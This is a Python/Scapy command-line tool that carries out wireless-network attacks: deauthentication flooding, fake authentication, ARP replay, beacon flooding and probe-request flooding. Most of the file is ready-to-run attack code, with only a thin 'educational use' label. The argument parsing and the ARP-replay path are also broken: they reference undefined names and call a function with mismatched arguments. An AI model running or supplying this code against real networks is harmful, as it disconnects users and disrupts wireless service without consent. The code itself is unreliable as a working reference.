#!/usr/bin/env python3
import argparse
import sys
import random
import time
import threading
from scapy.all import *
from scapy.layers.dot11 import *
from scapy.layers.l2 import ARP, Ether

# Colors for terminal output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

def print_info(msg):
    print(f"{CYAN}[INFO]{RESET} {msg}")

def print_warn(msg):
    print(f"{YELLOW}[WARN]{RESET} {msg}")

def print_error(msg):
    print(f"{RED}[ERROR]{RESET} {msg}")

def print_good(msg):
    print(f"{GREEN}[OK]{RESET} {msg}")

# ================== DEAUTH ATTACK ==================
def deauth_attack(iface, ap_mac, client_mac=None, count=10):
    print_info(f"Starting Deauth attack on AP {ap_mac}, Client: {client_mac if client_mac else 'ALL'}, Interface: {iface}")
    dot11 = Dot11(addr1=client_mac if client_mac else "ff:ff:ff:ff:ff:ff",
                  addr2=ap_mac,
                  addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sent = 0

    def sniff_ack(pkt):
        # Look for ACK frames sent by target client or AP
        if pkt.haslayer(Dot11):
            if pkt.type == 1 and pkt.subtype == 13:  # ACK frame subtype=13
                print_good(f"Captured ACK frame from {pkt.addr2}")

    sniff_thread = threading.Thread(target=sniff, kwargs={'iface': iface, 'prn': sniff_ack, 'store': 0})
    sniff_thread.daemon = True
    sniff_thread.start()

    try:
        while count == -1 or sent < count:
            sendp(packet, iface=iface, verbose=0)
            sent += 1
            if sent % 10 == 0:
                print_info(f"Sent {sent} deauth packets")
            time.sleep(0.1)
    except KeyboardInterrupt:
        print_warn("Deauth attack interrupted by user")
    print_good(f"Deauth attack finished, total packets sent: {sent}")

# ================== FAKE AUTH ATTACK ==================
def fake_auth_attack(iface, ap_mac, your_mac, count=10):
    print_info(f"Starting Fake Auth attack on AP {ap_mac} from {your_mac}, Interface: {iface}")
    dot11 = Dot11(type=0, subtype=11, addr1=ap_mac, addr2=your_mac, addr3=ap_mac)
    auth = Dot11Auth(algo=0, seqnum=1, status=0)
    packet = RadioTap()/dot11/auth
    sent = 0

    try:
        while count == -1 or sent < count:
            sendp(packet, iface=iface, verbose=0)
            sent += 1
            if sent % 10 == 0:
                print_info(f"Sent {sent} fake auth packets")
            time.sleep(0.1)
    except KeyboardInterrupt:
        print_warn("Fake Auth attack interrupted by user")
    print_good(f"Fake Auth attack finished, total packets sent: {sent}")
    
# ================== ARP REPLAY ATTACK jako aireplay-ng ==================
def arp_replay_attack(iface, pcap_file):
    print_info(f"Starting ARP Replay attack with packet from '{pcap_file}' on interface {iface}")
    packets = rdpcap(pcap_file)
    # Najdeme první ARP request v pcapu
    arp_packet = None
    for pkt in packets:
        if ARP in pkt and pkt[ARP].op == 1:  # who-has request
            arp_packet = pkt
            break
    if arp_packet is None:
        print_fail("No ARP request packet found in the pcap file!")
        return

    print_info("Using following ARP request packet for replay:")
    arp_packet.show()

    try:
        while True:
            sendp(arp_packet, iface=iface, verbose=0)
            print_info("Sent ARP replay packet")
            time.sleep(0.05)  # cca 20 paketů za sekundu
    except KeyboardInterrupt:
        print_warn("ARP Replay attack interrupted by user")

# ================== BEACON FLOOD ==================
def beacon_flood(iface, ssid_file):
    print_info(f"Starting Beacon Flood on interface {iface} using SSIDs from {ssid_file}")
    try:
        with open(ssid_file, 'r') as f:
            ssids = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print_error(f"Failed to open SSID file: {e}")
        sys.exit(1)

    def random_mac():
        mac = [ 0x00, 0x16, 0x3e,
                random.randint(0x00, 0x7f),
                random.randint(0x00, 0xff),
                random.randint(0x00, 0xff) ]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    sent = 0
    try:
        while True:
            for ssid in ssids:
                dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                              addr2=random_mac(), addr3=random_mac())
                beacon = Dot11Beacon(cap="ESS+privacy")
                essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                rsn = Dot11Elt(ID=48, info=(
                    b'\x01\x00'                 # RSN Version 1
                    b'\x00\x0f\xac\x04'         # Group Cipher Suite : AES
                    b'\x01\x00'                 # 1 Pairwise Cipher Suite
                    b'\x00\x0f\xac\x04'         # AES Cipher
                    b'\x01\x00'                 # 1 Authentication Key Management Suite (802.1X)
                    b'\x00\x0f\xac\x02'         # Authentication Key Management : PSK
                    b'\x00\x00'))               # RSN Capabilities

                packet = RadioTap()/dot11/beacon/essid/rsn
                sendp(packet, iface=iface, verbose=0)
                sent += 1
                if sent % 20 == 0:
                    print_info(f"Sent {sent} beacon frames")
                time.sleep(0.05)
    except KeyboardInterrupt:
        print_warn("Beacon flood interrupted by user")
    print_good(f"Beacon flood finished, total packets sent: {sent}")

# ================== PROBE REQUEST FLOOD ==================
def probe_request_flood(iface):
    print_info(f"Starting Probe Request Flood on interface {iface}")

    def random_mac():
        mac = [ 0x00, 0x16, 0x3e,
                random.randint(0x00, 0x7f),
                random.randint(0x00, 0xff),
                random.randint(0x00, 0xff) ]
        return ':'.join(map(lambda x: "%02x" % x, mac))

    sent = 0
    try:
        while True:
            mac = random_mac()
            dot11 = Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
                          addr2=mac, addr3="ff:ff:ff:ff:ff:ff")
            essid = Dot11Elt(ID="SSID", info="", len=0)  # broadcast probe (empty SSID)
            packet = RadioTap()/dot11/essid
            sendp(packet, iface=iface, verbose=0)
            sent += 1
            if sent % 50 == 0:
                print_info(f"Sent {sent} probe requests")
            time.sleep(0.02)
    except KeyboardInterrupt:
        print_warn("Probe Request flood interrupted by user")
    print_good(f"Probe Request flood finished, total packets sent: {sent}")

# =============== ARG PARSER ===============
def parse_args():
    parser = argparse.ArgumentParser(description="Advanced WiFi attacks tool for educational use (Linux only)")

    # Deauth attack
    parser.add_argument("--deauth", action='store_true', help="Perform Deauth attack")
    parser.add_argument("-n", type=int, default=10, help="Number of packets to send (-1 for infinite)")
    parser.add_argument("-a", metavar="AP_MAC", help="MAC address of target AP")
    parser.add_argument("-c", metavar="CLIENT_MAC", help="Target client MAC address (optional for deauth)")
    
    # Fake Auth attack
    parser.add_argument("--fakeauth", action='store_true', help="Perform Fake Authentication attack")
    parser.add_argument("-m", metavar="YOUR_MAC", help="Your MAC address (required for fakeauth and arpreplay)")

    # ARP replay attack parser
    arpreplay_parser = subparsers.add_parser("arpreplay", help="ARP Replay attack (replay captured ARP request)")
    arpreplay_parser.add_argument("-r", "--pcap", required=True, help="PCAP file with ARP request packet to replay")
    arpreplay_parser.add_argument("iface", help="Interface to use")


    # Beacon flood
    parser.add_argument("--beacon", action='store_true', help="Perform Beacon Flood attack")
    parser.add_argument("-f", metavar="SSID_FILE", help="File containing list of SSIDs for beacon flood")

    # Probe request flood
    parser.add_argument("--probe", action='store_true', help="Perform Probe Request Flood attack")

    # Interface (mandatory for all attacks)
    parser.add_argument("interface", help="Wireless interface in monitor mode")

    args = parser.parse_args()

    # Validation
    if args.deauth:
        if not args.a:
            parser.error("Deauth attack requires -a <AP_MAC>")
    if args.fakeauth:
        if not args.a or not args.m:
            parser.error("Fakeauth requires -a <AP_MAC> and -m <Your MAC>")
    if args.arpreplay:
        if not args.b or not args.m:
            parser.error("ARPreplay requires -b <AP_MAC> and -m <Your MAC>")
    if args.beacon:
        if not args.f:
            parser.error("Beacon flood requires -f <SSID file>")
    if not (args.deauth or args.fakeauth or args.arpreplay or args.beacon or args.probe):
        parser.error("You must specify at least one attack mode (--deauth, --fakeauth, --arpreplay, --beacon, --probe)")

    return args

# =============== MAIN ===============
def main():
    args = parse_args()

    if args.deauth:
        deauth_attack(args.interface, args.a.lower(), args.c.lower() if args.c else None, args.n)
    elif args.fakeauth:
        fake_auth_attack(args.interface, args.a.lower(), args.m.lower(), args.n)
    elif args.arpreplay:
        arp_replay_attack(args.interface, args.b.lower(), args.m.lower())
    elif args.beacon:
        beacon_flood(args.interface, args.f)
    elif args.probe:
        probe_request_flood(args.interface)
    else:
        print_error("No valid attack selected")

if __name__ == "__main__":
    # Ensure running as root
    if os.geteuid() != 0:
        print_error("You need to run this script as root")
        sys.exit(1)
    main()
